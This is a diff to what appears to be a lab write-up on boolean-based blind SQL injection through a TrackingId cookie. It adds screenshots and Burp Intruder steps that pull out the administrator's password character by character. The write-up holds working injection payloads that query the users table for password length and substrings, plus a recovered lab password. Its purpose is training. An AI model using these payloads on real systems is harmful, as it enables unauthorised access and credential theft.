@@ -25,6 +25,9 @@ Modify it to:
 TrackingId=xyz' AND 1=1--
 ```
 
+<img width="1278" height="741" alt="Screenshot 2026-08-08 at 9 25 59 PM" src="https://github.com/user-attachments/assets/f9469b07-17d0-4df3-8c5a-eac93d4aa23b" />
+
+
 ### SQL Example
 
 Suppose the application executes:
@@ -89,6 +92,10 @@ Result:
 Welcome back disappears
 ```
 
+<img width="1279" height="768" alt="Screenshot 2026-08-08 at 9 26 44 PM" src="https://github.com/user-attachments/assets/db3a9074-0d9f-4c7b-89d4-420e85b3ed2f" />
+
+
+
 This confirms that the application's response changes based on the truth of the injected condition.
 
 ---
@@ -126,6 +133,9 @@ The comparison:
 ```
 
 is **TRUE**, so "Welcome back" appears.
+
+<img width="1273" height="714" alt="Screenshot 2026-08-08 at 9 27 57 PM" src="https://github.com/user-attachments/assets/5853b2b8-29b5-4bee-9224-6e8586cea297" />
+
 
 If the table didn't exist, the query would fail or evaluate as false.
 
@@ -179,6 +189,9 @@ appears.
 
 ---
 
+<img width="1275" height="766" alt="Screenshot 2026-08-08 at 9 29 34 PM" src="https://github.com/user-attachments/assets/6737c3fb-dc4a-4792-963b-0c5b3efdd70c" />
+
+
 # Step 5: Determine the Password Length
 
 Start with:
@@ -187,6 +200,10 @@ Start with:
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
 AND LENGTH(password)>1)='a'--
 ```
+
+
+<img width="1277" height="767" alt="Screenshot 2026-08-08 at 9 31 36 PM" src="https://github.com/user-attachments/assets/d3bb829d-76cf-4f0a-8647-47b76a90877a" />
+
 
 Suppose the password is:
 
@@ -376,7 +393,7 @@ This covers digits.
 Now use:
 
 ```sql
-**TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--**
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
 ```
 
 ---
@@ -395,11 +412,42 @@ Instead:
 You get:
 
 ```
-**TrackingId=xyz' AND (SELECT SUBSTRING(password,**§**1**§**,1) FROM users WHERE username='administrator')='**§**a**§**'--**
+TrackingId=xyz' AND (SELECT SUBSTRING(password,**§**1**§**,1) FROM users WHERE username='administrator')='**§**a**§**'--
+
+```
+The `§...§` markers tell Intruder where to insert payloads.
+
+<img width="1271" height="767" alt="Screenshot 2026-08-08 at 9 15 23 PM" src="https://github.com/user-attachments/assets/fa9bb67f-bfa8-4820-969a-223a8c34951b" />
+
+<img width="1277" height="769" alt="Screenshot 2026-08-08 at 9 15 06 PM" src="https://github.com/user-attachments/assets/461a9ce0-19c3-440a-991e-23801b6e6d8e" />
+
+<img width="1279" height="738" alt="Screenshot 2026-08-08 at 9 14 44 PM" src="https://github.com/user-attachments/assets/032b16f2-d86c-4709-8162-9b71c2901b4a" />
+
+or
+
+# Attempt simgle time one by one
+```
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='**§**a**§**'--
+
+```
+The `§...§` markers tell Intruder where to insert payloads.
+
+<img width="1279" height="768" alt="Screenshot 2026-08-08 at 9 20 13 PM" src="https://github.com/user-attachments/assets/196c77b4-fe5a-475e-b0c9-500ddfd024f6" />
+
+<img width="1277" height="767" alt="Screenshot 2026-08-08 at 9 19 08 PM" src="https://github.com/user-attachments/assets/ee045780-2483-4527-ae83-98b6dec4f877" />
+
+
+# Next replace 1 by 2/3/4/5......
+
+```
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='**§**a**§**'--
 
 ```
 
-The `§...§` markers tell Intruder where to insert payloads.
+<img width="1280" height="767" alt="Screenshot 2026-08-08 at 9 23 43 PM" src="https://github.com/user-attachments/assets/81c65169-941c-4feb-b36a-7042130144e4" />
+
+<img width="1277" height="765" alt="Screenshot 2026-08-08 at 9 22 34 PM" src="https://github.com/user-attachments/assets/7f527585-1fcb-4f56-a3d4-f24c398fbef6" />
+
 
 ---
 
@@ -441,21 +489,6 @@ Password
 ```
 t9e107uapbezcb55vl4y
 ```
-
-Now every response is checked automatically.
-
-Results look like:
-
-| Payload | Welcome back |
-| --- | --- |
-| a | ❌ |
-| b | ❌ |
-| c | ❌ |
-| ... | ... |
-| m | ✅ |
-| n | ❌ |
-
-The row with the checkmark reveals the correct character.
 
 ---
 
